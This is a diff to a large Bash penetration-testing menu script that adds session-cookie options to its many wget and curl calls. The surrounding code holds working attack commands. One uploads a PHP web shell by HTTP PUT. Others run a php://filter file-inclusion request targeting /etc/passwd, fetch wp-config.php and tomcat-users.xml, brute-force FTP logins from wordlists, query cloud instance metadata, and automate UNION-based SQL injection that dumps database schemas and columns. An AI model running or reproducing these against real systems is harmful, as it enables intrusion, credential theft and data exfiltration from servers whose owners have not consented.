@@ -41,17 +41,17 @@ function ScaricaIn
 {
 	if [[ -d "$ALD" ]];
 	then
-		wget $SHEADER $USERAGENT --no-check-certificate "$1" -O "$ALD""$2"
+		wget $WCOOKIE $SHEADER $USERAGENT --no-check-certificate "$1" -O "$ALD""$2"
 	elif [[ -d "$AZD" ]];
 	then
-		wget $SHEADER $USERAGENT --no-check-certificate "$1" -O "$AZD""$2"
+		wget $WCOOKIE $SHEADER $USERAGENT --no-check-certificate "$1" -O "$AZD""$2"
 	else
 		ls /storage
 		echo "Digit where download, remember the slash at the end of the path"
 		read -e -p "(example, /storage/emulated/legacy/Download/): " ATD
 		if [[ -d "$ATD" ]];
 		then
-			wget $SHEADER $USERAGENT --no-check-certificate "$1" -O "$ATD""$2"
+			wget $WCOOKIE $SHEADER $USERAGENT --no-check-certificate "$1" -O "$ATD""$2"
 		fi
 	fi
 	echo "Downloaded ""$2"
@@ -146,7 +146,7 @@ function Clona
 	DKF="Dockerfile"
 	echo "Choose what version you want to download ""$1"
 	echo "0. back"
-	if [[ $(wget $SHEADER $USERAGENT -q -S --spider "$ENTRAW""$1""/master/""$DKF" 2>&1) == *"200 OK"* || $(wget $SHEADER $USERAGENT -q -S --spider "$ENTRAW""$1""/main/""$DKF" 2>&1) == *"200 OK"* ]];
+	if [[ $(wget $WCOOKIE $SHEADER $USERAGENT -q -S --spider "$ENTRAW""$1""/master/""$DKF" 2>&1) == *"200 OK"* || $(wget $WCOOKIE $SHEADER $USERAGENT -q -S --spider "$ENTRAW""$1""/main/""$DKF" 2>&1) == *"200 OK"* ]];
 	then
 		echo "1. Dockerfile"
 	fi
@@ -157,7 +157,7 @@ function Clona
 		echo "2. Release"
 	fi
 	echo "3. Clone"
-	if [[ $(wget $SHEADER $USERAGENT -q -S --spider "$ENTRAW""$1""/master/README.md" 2>&1) == *"200 OK"* || $(wget $SHEADER $USERAGENT -q -S --spider "$ENTRAW""$1""/main/README.md" 2>&1) == *"200 OK"* ]];
+	if [[ $(wget $WCOOKIE $SHEADER $USERAGENT -q -S --spider "$ENTRAW""$1""/master/README.md" 2>&1) == *"200 OK"* || $(wget $WCOOKIE $SHEADER $USERAGENT -q -S --spider "$ENTRAW""$1""/main/README.md" 2>&1) == *"200 OK"* ]];
 	then
 		echo "4. read the README.md file"
 	fi
@@ -170,11 +170,11 @@ function Clona
 		then
 			docker build -t $(echo -n "$1" | awk -F "/" '{print $2}') "$ENTSSL""$1"".git"
 		else
-			if [[ $(wget $SHEADER $USERAGENT -q -S --spider "$ENTRAW""$1""/master/""$DKF" 2>&1) == *"200 OK"* ]];
+			if [[ $(wget $WCOOKIE $SHEADER $USERAGENT -q -S --spider "$ENTRAW""$1""/master/""$DKF" 2>&1) == *"200 OK"* ]];
 			then
 				Scarica "$ENTRAW""$1""/master/""$DKF" "$DKF"
 			else
-				if [[ $(wget $SHEADER $USERAGENT -q -S --spider "$ENTRAW""$1""/main/""$DKF" 2>&1) == *"200 OK"* ]];
+				if [[ $(wget $WCOOKIE $SHEADER $USERAGENT -q -S --spider "$ENTRAW""$1""/main/""$DKF" 2>&1) == *"200 OK"* ]];
 				then
 					Scarica "$ENTRAW""$1""/main/""$DKF" "$DKF"
 				else
@@ -212,12 +212,12 @@ function Clona
 		else
 			LESS="less"
 		fi
-		if [[ $(wget $SHEADER $USERAGENT -q -S --spider "$ENTRAW""$1""/master/README.md" 2>&1) == *"200 OK"* ]];
+		if [[ $(wget $WCOOKIE $SHEADER $USERAGENT -q -S --spider "$ENTRAW""$1""/master/README.md" 2>&1) == *"200 OK"* ]];
 		then
-			curl $SHEADER $USERAGENT -s -k -L "$ENTRAW""$1""/master/README.md" | $LESS
-		elif [[ $(wget $SHEADER $USERAGENT -q -S --spider "$ENTRAW""$1""/main/README.md" 2>&1) == *"200 OK"* ]];
+			curl $CCOOKIE $SHEADER $USERAGENT -s -k -L "$ENTRAW""$1""/master/README.md" | $LESS
+		elif [[ $(wget $WCOOKIE $SHEADER $USERAGENT -q -S --spider "$ENTRAW""$1""/main/README.md" 2>&1) == *"200 OK"* ]];
 		then
-			curl $SHEADER $USERAGENT -s -k -L "$ENTRAW""$1""/main/README.md" | $LESS
+			curl $CCOOKIE $SHEADER $USERAGENT -s -k -L "$ENTRAW""$1""/main/README.md" | $LESS
 		else
 			echo "There is not any README.md file"
 		fi
@@ -231,9 +231,9 @@ function Controlla
 {
 	if [[ "$ANON" == "Enabled" ]];
 	then
-		curl $SHEADER $USERAGENT -s -k -L -I $CURLANON "$1"
+		curl $CCOOKIE $SHEADER $USERAGENT -s -k -L -I $CURLANON "$1"
 	else
-		wget $SHEADER $USERAGENT --no-check-certificate --spider "$1"
+		wget $WCOOKIE $SHEADER $USERAGENT --no-check-certificate --spider "$1"
 	fi
 }
 
@@ -241,9 +241,9 @@ function ScaricaWL
 {
 	if [[ "$ANON" == "Enabled" ]];
 	then
-		curl $SHEADER $USERAGENT -s -k -L $CURLANON "$1"
+		curl $CCOOKIE $SHEADER $USERAGENT -s -k -L $CURLANON "$1"
 	else
-		wget $SHEADER $USERAGENT --no-check-certificate "$1" -O -
+		wget $WCOOKIE $SHEADER $USERAGENT --no-check-certificate "$1" -O -
 	fi
 }
 
@@ -253,19 +253,19 @@ function Scarica
 	then
 		if [[ "$2" != "" ]];
 		then
-			curl $SHEADER $USERAGENT -s -k -L $CURLANON "$1" -o "$2"
+			curl $CCOOKIE $SHEADER $USERAGENT -s -k -L $CURLANON "$1" -o "$2"
 		else
 			QUESTO="./"$(echo "$1" | awk -F "/" '{print $NF}')
-			curl $SHEADER $USERAGENT -s -k -L $CURLANON "$1" -o "$QUESTO"
+			curl $CCOOKIE $SHEADER $USERAGENT -s -k -L $CURLANON "$1" -o "$QUESTO"
 			chmod +x "$QUESTO"
 		fi
 	else
 		if [[ "$2" != "" ]];
 		then
-			wget $SHEADER $USERAGENT --no-check-certificate "$1" -O "$2"
+			wget $WCOOKIE $SHEADER $USERAGENT --no-check-certificate "$1" -O "$2"
 			chmod +x "./""$2"
 		else
-			wget $SHEADER $USERAGENT --no-check-certificate "$1"
+			wget $WCOOKIE $SHEADER $USERAGENT --no-check-certificate "$1"
 			chmod +x "./"$(echo "$1" | awk -F "/" '{print $NF}')
 		fi
 	fi
@@ -2087,7 +2087,7 @@ while true; do
 		Stampa " 2658. XOR bitwise an array of chars converted in INT values"
 		Stampa " 2662. OR bitwise a string value" "2660. OR bitwise an array of chars converted in INT values"
 		echo " 2659. AND bitwise an array of chars converted in INT values"
-		Stampa " 2663. set User-Agent" "2664. set Headers"
+		Stampa " 2663. set User-Agent" "2664. set Headers" "2665. Set Cookies"
 		echo "$SEP"
 	fi
 	echo "$CGT"" GT. VIRTUAL COINS - CURRENCIES"
@@ -2278,8 +2278,10 @@ while true; do
 	Stampa "Target: ""$TIP"":$TPRT" "Target domain: ""$TDOM" "Target username: ""$TUSRN"
 	Stampa "Target password: ""$TPSSW" "Wordlist: ""$WORDLIST" "YOU: ""$MIP"":$MPRT"
 	Stampa "Target URL: ""$TURL"
-	echo " Headers: ""$SHEADER"
+	echo "Headers: ""$SHEADER"
 	echo "User-Agent: ""$USERAGENT"
+	echo "Cookies: ""$WCOOKIE"
+	echo -e "\t""$CCOOKIE\n"
 	echo "Anonymization: $ANON"
 	echo "$SEP"
 	Stampa " 0. exit" "2570. Anonymization"
@@ -2729,7 +2731,7 @@ while true; do
 	;;
 	"44")
 		Clona "lc/gau"
-		wget $SHEADER $USERAGENT --no-check-certificate "$ENTRAW""kleiton0x00/CORS-one-liner/master/README.md" -O "CORS-one-liner-README.txt"
+		wget $WCOOKIE $SHEADER $USERAGENT --no-check-certificate "$ENTRAW""kleiton0x00/CORS-one-liner/master/README.md" -O "CORS-one-liner-README.txt"
 	;;
 	"45")
 		Clona "porterhau5/BloodHound-Owned"
@@ -3443,7 +3445,7 @@ while true; do
 				read -p "(example, fetch 1:* (UID FLAGS INTERNALDATE ENVELOPE)): " IMAPREQ
 				if [[ "$IMAPREQ" != "" ]];
 				then
-					curl $SHEADER $USERAGENT $CURLANON --url "$IMAPURL" --user "$EMAILADD" --request "$IMAPREQ"
+					curl $CCOOKIE $SHEADER $USERAGENT $CURLANON --url "$IMAPURL" --user "$EMAILADD" --request "$IMAPREQ"
 				fi
 			fi
 		fi
@@ -4951,7 +4953,7 @@ while true; do
 			read -p "(example, ../../etc/passwd or ./index.php): " PAGE
 			if [[ "$PAGE" != "" ]];
 			then
-				curl $SHEADER $USERAGENT $CURLANON "$URL""php://filter/convert.base64-encode/resource=""$PAGE"
+				curl $CCOOKIE $SHEADER $USERAGENT $CURLANON "$URL""php://filter/convert.base64-encode/resource=""$PAGE"
 			fi
 		fi
 	;;
@@ -5087,7 +5089,7 @@ while true; do
 		read -p "(example, http://site.web or http://192.168.0.12): " TURL
 		if [[ "$TURL" != "" ]];
 		then
-			for FILE in "conf/tomcat-users.xml" "wp-includes/certificates/ca-bundle.crt" "robots.txt" ".htaccess" "condig.php" "sitemap.xml" "phpinfo.php" "wp-config.php"; do wget $SHEADER $USERAGENT "$TURL""/""$FILE"; done
+			for FILE in "conf/tomcat-users.xml" "wp-includes/certificates/ca-bundle.crt" "robots.txt" ".htaccess" "condig.php" "sitemap.xml" "phpinfo.php" "wp-config.php"; do wget $WCOOKIE $SHEADER $USERAGENT "$TURL""/""$FILE"; done
 		fi
 	;;
 	"599")
@@ -5102,7 +5104,7 @@ while true; do
 			read -e -p "(example, wsh3ll): " SHL
 			if [[ "$SHL" != "" ]];
 			then
-				curl $SHEADER $USERAGENT -s -k -L $CURLANON -v -X PUT -d '<?php system($_GET["cmd"]);?>' "$TURL""/""$SHL"".php"
+				curl $CCOOKIE $SHEADER $USERAGENT -s -k -L $CURLANON -v -X PUT -d '<?php system($_GET["cmd"]);?>' "$TURL""/""$SHL"".php"
 			fi
 		fi
 	;;
@@ -5372,7 +5374,7 @@ while true; do
 				TDP="$TTDP"
 			fi
 		fi
-		curl $SHEADER $USERAGENT $CURLANON -s "$TURL"":""$TDP""/version" | python -m json.tool
+		curl $CCOOKIE $SHEADER $USERAGENT $CURLANON -s "$TURL"":""$TDP""/version" | python -m json.tool
 	;;
 	"653")
 		Clona "adnane-X-tebbaa/GRecon"
@@ -5721,7 +5723,7 @@ while true; do
 			echo "Digit a target IP"
 			read -p "(example, 10.11.12.13): " TIP
 		fi
-		wget $SHEADER $USERAGENT -m --no-passive ftp://anonymous:anonymous@$TIP
+		wget $WCOOKIE $SHEADER $USERAGENT -m --no-passive ftp://anonymous:anonymous@$TIP
 	;;
 	"750")
 		if [[ "$TIP" == "0.0.0.0" ]];
@@ -5741,7 +5743,7 @@ while true; do
 				do
 					for USRN in $(cat "$UWRD");
 					do
-						wget $SHEADER $USERAGENT -m --no-passive "ftp://$USRN:$PSSW@$TIP"
+						wget $WCOOKIE $SHEADER $USERAGENT -m --no-passive "ftp://$USRN:$PSSW@$TIP"
 					done
 				done
 			fi
@@ -11040,7 +11042,7 @@ while true; do
 		if [[ "$TURL" != "" ]];
 		then
 			export TOKEN=`curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" "$TURL/latest/api/token"`
-			curl $SHEADER $USERAGENT -s -k -L $CURLANON -H "X-aws-ec2-metadata-token:$TOKEN" -v "$TURL/latest/meta-data"
+			curl $CCOOKIE $SHEADER $USERAGENT -s -k -L $CURLANON -H "X-aws-ec2-metadata-token:$TOKEN" -v "$TURL/latest/meta-data"
 		fi
 	;;
 	"2424")
@@ -12218,7 +12220,7 @@ while true; do
 			MWHE=""
 			MFRO=""
 			echo "$PAR"" ""$UNION"" ""$SELECT"" version() -- -"
-			curl $SHEADER $USERAGENT -v -k -X POST -d "$PAR"" ""$UNION"" ""$SELECT"" version() -- -" "$TURL"
+			curl $CCOOKIE $SHEADER $USERAGENT -v -k -X POST -d "$PAR"" ""$UNION"" ""$SELECT"" version() -- -" "$TURL"
 			for I in {1..9}
 			do
 				if [[ "$Q" == "" ]];
@@ -12228,7 +12230,7 @@ while true; do
 					Q="$Q""$I"","
 				fi
 				echo "$PAR"" ""$UNION"" ""$SELECT"" ""$Q""version() -- -"
-				curl $SHEADER $USERAGENT -v -k -X POST -d "$PAR"" ""$UNION"" ""$SELECT ""$Q""version() -- -" "$TURL"
+				curl $CCOOKIE $SHEADER $USERAGENT -v -k -X POST -d "$PAR"" ""$UNION"" ""$SELECT ""$Q""version() -- -" "$TURL"
 			done
 			echo "Digit the position of version, if was the first occurence, digit 1, otherwise digit the position number ignoring other numbers"
 			echo "'1,2,8.0.15', the position will be 3 (ignoring the other numbers)"
@@ -12263,9 +12265,9 @@ while true; do
 						for B in $(seq 0 $FST)
 						do
 							echo "$PAR"" ""$UNION"" ""$SELECT"" ""$PES""$CONCAT""(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") ""$FROM"" INFORMATION_SCHEMA.COLUMNS ""$WHERE"" TABLE_SCHEMA != 'Information_Schema' ""$LIMIT"" ""$A"" ""$OFFSET"" ""$B"" -- -"
-							curl $SHEADER $USERAGENT -v -k -X POST -d "$PAR"" ""$UNION"" ""$SELECT"" ""$PES""$CONCAT""(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") ""$FROM"" INFORMATION_SCHEMA.COLUMNS ""$WHERE"" TABLE_SCHEMA != 'Information_Schema' ""$LIMIT"" ""$A"" ""$OFFSET"" ""$B"" -- -" "$TURL"
+							curl $CCOOKIE $SHEADER $USERAGENT -v -k -X POST -d "$PAR"" ""$UNION"" ""$SELECT"" ""$PES""$CONCAT""(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") ""$FROM"" INFORMATION_SCHEMA.COLUMNS ""$WHERE"" TABLE_SCHEMA != 'Information_Schema' ""$LIMIT"" ""$A"" ""$OFFSET"" ""$B"" -- -" "$TURL"
 							##echo "$PAR"" ""$UNION"" ""$SELECT"" ""$PES""$CONCAT""(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") ""$FROM"" INFORMATION_SCHEMA.COLUMNS ""$WHERE"" TABLE_SCHEMA != 'Information_Schema' ""$LIMIT"" ""$A"" ""$OFFSET"" ""$B"" -- -"
-							##curl $SHEADER $USERAGENT -v -k -X POST -d "$PAR"" ""$UNINON"" ""$SELECT"" ""$PES""$CONCAT""(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") ""$FROM"" INFORMATION_SCHEMA.COLUMNS ""$LIMIT"" ""$A"" ""$OFFSET"" ""$B"" -- -" "$TURL"
+							##curl $CCOOKIE $SHEADER $USERAGENT -v -k -X POST -d "$PAR"" ""$UNINON"" ""$SELECT"" ""$PES""$CONCAT""(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") ""$FROM"" INFORMATION_SCHEMA.COLUMNS ""$LIMIT"" ""$A"" ""$OFFSET"" ""$B"" -- -" "$TURL"
 						done
 					done
 				else
@@ -12274,9 +12276,9 @@ while true; do
 						for B in $(seq 0 $FST)
 						do
 							echo "$PAR"" ""$UNION"" ""$SELECT"" ""$CONCAT""(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") ""$FROM"" INFORMATION_SCHEMA.COLUMNS ""$WHERE"" TABLE_SCHEMA != 'Information_Schema' ""$LIMIT"" ""$A"" ""$OFFSET"" ""$B"" -- -"
-							curl $SHEADER $USERAGENT -v -k -X POST -d "$PAR"" ""$UNION"" ""$SELECT"" ""$CONCAT""(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") ""$FROM"" INFORMATION_SCHEMA.COLUMNS ""$WHERE"" TABLE_SCHEMA != 'Information_Schema' ""$LIMIT"" ""$A"" ""$OFFSET"" ""$B"" -- -" "$TURL"
+							curl $CCOOKIE $SHEADER $USERAGENT -v -k -X POST -d "$PAR"" ""$UNION"" ""$SELECT"" ""$CONCAT""(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") ""$FROM"" INFORMATION_SCHEMA.COLUMNS ""$WHERE"" TABLE_SCHEMA != 'Information_Schema' ""$LIMIT"" ""$A"" ""$OFFSET"" ""$B"" -- -" "$TURL"
 							##echo "$PAR"" ""$UNION"" ""$SELECT"" ""$CONCAT""(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") ""$FROM"" INFORMATION_SCHEMA.COLUMNS ""$LIMIT"" ""$A"" ""$OFFSET"" ""$B"" -- -"
-							##curl $SHEADER $USERAGENT -v -k -X POST -d "$PAR"" ""$UNION"" ""$SELECT"" ""$CONCAT""(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") ""$FROM"" INFORMATION_SCHEMA.COLUMNS ""$LIMIT"" ""$A"" ""$OFFSET"" ""$B"" -- -" "$TURL"
+							##curl $CCOOKIE $SHEADER $USERAGENT -v -k -X POST -d "$PAR"" ""$UNION"" ""$SELECT"" ""$CONCAT""(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") ""$FROM"" INFORMATION_SCHEMA.COLUMNS ""$LIMIT"" ""$A"" ""$OFFSET"" ""$B"" -- -" "$TURL"
 						done
 					done
 				fi
@@ -12295,7 +12297,7 @@ while true; do
 							then
 								if [[ "$CLMN" != "quit" ]];
 								then
-									curl $SHEADER $USERAGENT -v -k -X POST -d "$PAR"" ""$UNION"" ""$SELECT"" ""$CONCAT""(""$CLMN"") ""$FROM"" ""$TBLN"" -- -" "$TURL"
+									curl $CCOOKIE $SHEADER $USERAGENT -v -k -X POST -d "$PAR"" ""$UNION"" ""$SELECT"" ""$CONCAT""(""$CLMN"") ""$FROM"" ""$TBLN"" -- -" "$TURL"
 								fi
 							fi
 						fi
@@ -12767,16 +12769,19 @@ while true; do
 	;;
 	"2664")
 		echo "Digit header to add into array"
-		HEADER=""
 		while [[ "$HEADER" != "exit" ]];
 		do
 			HEADER=""
-			read -p "(digit exit to finish): " HEADER
-			if [[ "$HEADER" != "exit" ]];
+			read -p "(digit 'exit' to 'finish', reset to clear HEADERS, without quotes): " HEADER
+			if [[ "$HEADER" == "exit" ]];
 			then
-				HEADERS+=("$HEADER")
-			else
 				break
+			elif [[ "$HEADER" == "reset" ]];
+			then
+				SHEADER=""
+				HEADERS=("")
+			else
+				HEADERS+=("$HEADER")
 			fi
 		done
 		for HDR in "${HEADERS[@]}"
@@ -12788,6 +12793,17 @@ while true; do
 				SHEADER="--header \"""$HDR""\""
 			fi
 		done
+	;;
+	"2665")
+		echo "Digit a valid Cookie value, dividing with semicolon ;"
+		read -p "(example, ): " COOKIE
+		if [[ "$COOKIE" != "" ]];
+		then
+			CCOOKIE=""
+			CCOOKIE="-b \"""$COOKIE""\""
+			WCOOKIE=""
+			WCOOKIE="--keep-session-cookies --save-cookies cookies.txt"
+		fi
 	;;
 	"AA")
 		if [[ "$CAA" == "[+]" ]];
